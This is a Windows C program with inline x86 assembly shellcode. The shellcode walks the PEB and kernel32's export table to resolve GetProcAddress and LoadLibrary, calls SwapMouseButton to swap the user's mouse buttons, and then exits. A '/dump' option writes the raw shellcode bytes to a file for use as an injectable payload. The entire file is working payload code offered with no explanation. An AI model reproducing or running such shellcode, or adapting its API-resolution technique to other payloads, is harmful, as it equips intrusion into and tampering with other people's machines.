#include <stdio.h>
#include <Windows.h>

void WINAPI shellcode()
{
    __asm
    {
        xor ecx, ecx
        mov eax, fs: [ecx + 0x30] ; EAX = PEB
        mov eax, [eax + 0xc]; EAX = PEB->Ldr
        mov esi, [eax + 0x14]; ESI = PEB->Ldr.InMemOrder
        lodsd; EAX = Second module
        xchg eax, esi; EAX = ESI, ESI = EAX
        lodsd; EAX = Third(kernel32)
        mov ebx, [eax + 0x10]; EBX = Base address
        mov edx, [ebx + 0x3c]; EDX = DOS->e_lfanew
        add edx, ebx; EDX = PE Header
        mov edx, [edx + 0x78]; EDX = Offset export table
        add edx, ebx; EDX = Export table
        mov esi, [edx + 0x20]; ESI = Offset namestable
        add esi, ebx; ESI = Names table
        xor ecx, ecx; EXC = 0

        Get_Function:

        inc ecx; Increment the ordinal
        lodsd; Get name offset
        add eax, ebx; Get function name
        cmp dword ptr[eax], 0x50746547; GetP
        jnz Get_Function
        cmp dword ptr[eax + 0x4], 0x41636f72; rocA
        jnz Get_Function
        cmp dword ptr[eax + 0x8], 0x65726464; ddre
        jnz Get_Function
        mov esi, [edx + 0x24]; ESI = Offset ordinals
        add esi, ebx; ESI = Ordinals table
        mov cx, [esi + ecx * 2]; Number of function
        dec ecx
        mov esi, [edx + 0x1c]; Offset address table
        add esi, ebx; ESI = Address table
        mov edx, [esi + ecx * 4]; EDX = Pointer(offset)
        add edx, ebx; EDX = GetProcAddress

        xor ecx, ecx; ECX = 0
        push ebx; Kernel32 base address
        push edx; GetProcAddress
        push ecx; 0
        push 0x41797261; aryA
        push 0x7262694c; Libr
        push 0x64616f4c; Load
        push esp; "LoadLibrary"
        push ebx; Kernel32 base address
        call edx; GetProcAddress(LL)

        add esp, 0xc; pop "LoadLibrary"
        pop ecx; ECX = 0
        push eax; EAX = LoadLibrary
        push ecx
        mov cx, 0x6c6c; ll
        push ecx
        push 0x642e3233; 32.d
        push 0x72657375; user
        push esp; "user32.dll"
        call eax; LoadLibrary("user32.dll")

        add esp, 0x10; Clean stack
        mov edx, [esp + 0x4]; EDX = GetProcAddress
        xor ecx, ecx; ECX = 0
        push ecx
        mov ecx, 0x616E6F74; tona
        push ecx
        sub dword ptr[esp + 0x3], 0x61; Remove "a"
        push 0x74754265; eBut
        push 0x73756F4D; Mous
        push 0x70617753; Swap
        push esp; "SwapMouseButton"
        push eax; user32.dll address
        call edx; GetProc(SwapMouseButton)

        add esp, 0x14; Cleanup stack
        xor ecx, ecx; ECX = 0
        inc ecx; true
        push ecx; 1
        call eax; Swap!

        add esp, 0x4; Clean stack
        pop edx; GetProcAddress
        pop ebx; kernel32.dll base address
        mov ecx, 0x61737365; essa
        push ecx
        sub dword ptr[esp + 0x3], 0x61; Remove "a"
        push 0x636f7250; Proc
        push 0x74697845; Exit
        push esp
        push ebx; kernel32.dll base address
        call edx; GetProc(Exec)
        xor ecx, ecx; ECX = 0
        push ecx; Return code = 0
        call eax; ExitProcess
    }
    return;
}

DWORD WINAPI shellcodeEnd()
{
    return 0;
}

int main(int argc, char* argv[])
{
    HANDLE hFile;
    ULONG CodeSize = (ULONG)shellcodeEnd - (ULONG)shellcode, write;

    if (argc == 1) {
        shellcode();
    }
    else if (argc == 3) {
        if (!strcmp(argv[1], "/dump")) {
            hFile = CreateFileA(argv[2], GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, NULL); // Create the file

            if (hFile == INVALID_HANDLE_VALUE)
            {
                printf("\nError: Unable to create file (%u)\n", GetLastError());
                return -1;
            }

            if (!WriteFile(hFile, shellcode, CodeSize, &write, NULL)) // Write the shellcode into file
            {
                printf("\nError: Unable to write file (%u)\n", GetLastError());

                CloseHandle(hFile);
                return -1;
            }

            printf("\nShellcode successfully dumped\n");
            printf("Shellcode size: %u bytes\n", CodeSize);

            CloseHandle(hFile);
        }
        else {
            printf("Incorrect arguments");
        }
    }
    else {
        printf("Incorrect arguments");
    }
    
    return 0;
}